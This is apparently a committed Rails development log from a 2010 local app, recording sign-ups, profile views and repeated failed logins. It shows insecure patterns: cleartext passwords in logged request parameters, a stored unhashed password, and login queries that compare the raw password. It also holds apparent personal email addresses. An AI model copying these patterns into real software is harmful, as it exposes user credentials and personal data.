+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"g", "username"=>"cragan", "last_name"=>"d", "password"=>"g", "email"=>"c@x.com", "first_name"=>"d"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.3ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'cragan') LIMIT 1[0m
+  [4;36;1mUser Create (0.2ms)[0m   [0;1mINSERT INTO `users` (`salt`, `created_at`, `zip_code`, `updated_at`, `username`, `role_id`, `last_name`, `password`, `first_name`, `email`) VALUES('bc89e4934ee193f5a322adcc903f90fc927a57f4', '2010-12-02 02:41:12', '20148', '2010-12-02 02:41:12', 'cragan', 2, 'd', 'g', 'd', 'c@x.com')[0m
+  [4;35;1mSQL (0.4ms)[0m   [0mCOMMIT[0m
+Redirected to /users/5
+Completed in 69ms (DB: 2) | 302 Found [http://localhost/users]
+
+
+Processing UsersController#show (for 127.0.0.1 at 2010-12-01 21:41:12) [GET]
+  Parameters: {"id"=>"5"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.1ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (0.5ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 5) [0m
+found user
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 5) [0m
+Rendering template within layouts/application
+Rendering users/show
+  [4;35;1mComment Columns (1.3ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (0.2ms)[0m   [0;1mSELECT count(*) AS count_all FROM `comments` WHERE (`comments`.commentable_id = 5 AND `comments`.commentable_type = 'User') [0m
+  [4;35;1mEvent Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `events`[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mSELECT count(*) AS count_all FROM `events` WHERE (`events`.user_id = 5) [0m
+Completed in 521ms (View: 514, DB: 2) | 200 OK [http://localhost/users/5]
+
+
+Processing UsersController#new (for 127.0.0.1 at 2010-12-01 21:47:27) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 14ms (View: 8, DB: 1) | 200 OK [http://localhost/users/new]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:47:59) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "username"=>"crad", "last_name"=>"D", "password"=>"g", "email"=>"mitch.shue@gmail.com", "first_name"=>"h"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.4ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'crad') LIMIT 1[0m
+  [4;36;1mUser Create (0.2ms)[0m   [0;1mINSERT INTO `users` (`salt`, `created_at`, `zip_code`, `updated_at`, `username`, `role_id`, `last_name`, `password`, `first_name`, `email`) VALUES('503739138c81808e6efbca8b065fd11738b8fc84', '2010-12-02 02:47:59', '20148', '2010-12-02 02:47:59', 'crad', 2, 'D', '0bea7521c1b61009f96666c03075d7657b966260', 'h', 'mitch.shue@gmail.com')[0m
+  [4;35;1mSQL (0.5ms)[0m   [0mCOMMIT[0m
+Redirected to /users/6
+Completed in 72ms (DB: 2) | 302 Found [http://localhost/users]
+
+
+Processing UsersController#show (for 127.0.0.1 at 2010-12-01 21:47:59) [GET]
+  Parameters: {"id"=>"6"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.1ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (0.4ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendering template within layouts/application
+Rendering users/show
+  [4;35;1mComment Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (0.3ms)[0m   [0;1mSELECT count(*) AS count_all FROM `comments` WHERE (`comments`.commentable_id = 6 AND `comments`.commentable_type = 'User') [0m
+  [4;35;1mEvent Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `events`[0m
+  [4;36;1mSQL (0.4ms)[0m   [0;1mSELECT count(*) AS count_all FROM `events` WHERE (`events`.user_id = 6) [0m
+Completed in 22ms (View: 16, DB: 2) | 200 OK [http://localhost/users/6]
+
+
+Processing UsersController#new (for 127.0.0.1 at 2010-12-01 21:48:44) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 11ms (View: 6, DB: 1) | 200 OK [http://localhost/users/new]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:49:19) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "username"=>"santa", "last_name"=>"Ragan", "password"=>"claus", "email"=>"christelle.noel@lumension.com", "first_name"=>"Christine"}}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mSQL (0.9ms)[0m   [0mBEGIN[0m
+  [4;36;1mUser Exists (0.3ms)[0m   [0;1mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'santa') LIMIT 1[0m
+  [4;35;1mUser Create (0.2ms)[0m   [0mINSERT INTO `users` (`salt`, `created_at`, `zip_code`, `updated_at`, `username`, `role_id`, `last_name`, `password`, `first_name`, `email`) VALUES('31f4d989f1f1b28d2960ee8ac598c673b643f100', '2010-12-02 02:49:19', '20148', '2010-12-02 02:49:19', 'santa', 2, 'Ragan', '4a1ea641d188bd7a36d2ddf9e5ae0951ee295f69', 'Christine', 'christelle.noel@lumension.com')[0m
+  [4;36;1mSQL (0.5ms)[0m   [0;1mCOMMIT[0m
+Redirected to /users/7
+Completed in 13ms (DB: 3) | 302 Found [http://localhost/users]
+
+
+Processing UsersController#show (for 127.0.0.1 at 2010-12-01 21:49:19) [GET]
+  Parameters: {"id"=>"7"}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.3ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (0.7ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 7) [0m
+found user
+  [4;35;1mCACHE (0.0ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 7) [0m
+Rendering template within layouts/application
+Rendering users/show
+  [4;36;1mComment Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `comments`[0m
+  [4;35;1mSQL (0.4ms)[0m   [0mSELECT count(*) AS count_all FROM `comments` WHERE (`comments`.commentable_id = 7 AND `comments`.commentable_type = 'User') [0m
+  [4;36;1mEvent Columns (1.1ms)[0m   [0;1mSHOW FIELDS FROM `events`[0m
+  [4;35;1mSQL (0.6ms)[0m   [0mSELECT count(*) AS count_all FROM `events` WHERE (`events`.user_id = 7) [0m
+Completed in 23ms (View: 15, DB: 2) | 200 OK [http://localhost/users/7]
+
+
+Processing SessionController#logout (for 127.0.0.1 at 2010-12-01 21:49:22) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/logout
+Completed in 62ms (View: 4, DB: 0) | 200 OK [http://localhost/logout]
+
+
+Processing SessionController#login (for 127.0.0.1 at 2010-12-01 21:49:26) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/login
+Completed in 6ms (View: 4, DB: 0) | 200 OK [http://localhost/login]
+
+
+Processing SessionController#check_login (for 127.0.0.1 at 2010-12-01 21:49:36) [POST]
+  Parameters: {"commit"=>"Login", "authenticity_token"=>"0f79dbe6af010ce55cba4b913da3db4ad277e076", "user"=>{"username"=>"santa", "password"=>"claus"}}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Load (0.5ms)[0m   [0;1mSELECT * FROM `users` WHERE (username = 'santa' AND password = 'claus') LIMIT 1[0m
+Redirected to /login
+Completed in 6ms (DB: 1) | 302 Found [http://localhost/session/check_login]
+
+
+Processing SessionController#login (for 127.0.0.1 at 2010-12-01 21:49:36) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/login
+Completed in 6ms (View: 4, DB: 0) | 200 OK [http://localhost/login]
+
+
+Processing SessionController#check_login (for 127.0.0.1 at 2010-12-01 21:49:48) [POST]
+  Parameters: {"commit"=>"Login", "authenticity_token"=>"0f79dbe6af010ce55cba4b913da3db4ad277e076", "user"=>{"username"=>"santa", "password"=>"claus"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Load (0.3ms)[0m   [0mSELECT * FROM `users` WHERE (username = 'santa' AND password = 'claus') LIMIT 1[0m
+Redirected to /login
+Completed in 5ms (DB: 1) | 302 Found [http://localhost/session/check_login]
+
+
+Processing SessionController#login (for 127.0.0.1 at 2010-12-01 21:49:48) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/login
+Completed in 5ms (View: 3, DB: 0) | 200 OK [http://localhost/login]
+
+
+Processing SessionController#check_login (for 127.0.0.1 at 2010-12-01 21:51:28) [POST]
+  Parameters: {"commit"=>"Login", "authenticity_token"=>"0f79dbe6af010ce55cba4b913da3db4ad277e076", "user"=>{"username"=>"santa", "password"=>"claus"}}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Load (0.3ms)[0m   [0;1mSELECT * FROM `users` WHERE (username = 'santa' AND password = 'claus') LIMIT 1[0m
+Redirected to /login
+Completed in 5ms (DB: 1) | 302 Found [http://localhost/session/check_login]
+
+
+Processing SessionController#login (for 127.0.0.1 at 2010-12-01 21:51:29) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/login
+Completed in 6ms (View: 4, DB: 0) | 200 OK [http://localhost/login]
+
+
+Processing SessionController#login (for 127.0.0.1 at 2010-12-01 21:51:35) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/login
+Completed in 5ms (View: 3, DB: 0) | 200 OK [http://localhost/login]
+
+
+Processing SessionController#check_login (for 127.0.0.1 at 2010-12-01 21:51:46) [POST]
+  Parameters: {"commit"=>"Login", "authenticity_token"=>"0f79dbe6af010ce55cba4b913da3db4ad277e076", "user"=>{"username"=>"santa", "password"=>"claus"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.2ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Load (0.8ms)[0m   [0mSELECT * FROM `users` WHERE (username = 'santa' AND password = 'claus') LIMIT 1[0m
+Redirected to /login
+Completed in 6ms (DB: 1) | 302 Found [http://localhost/session/check_login]
+
+
+Processing SessionController#login (for 127.0.0.1 at 2010-12-01 21:51:46) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/login
+Completed in 6ms (View: 3, DB: 0) | 200 OK [http://localhost/login]
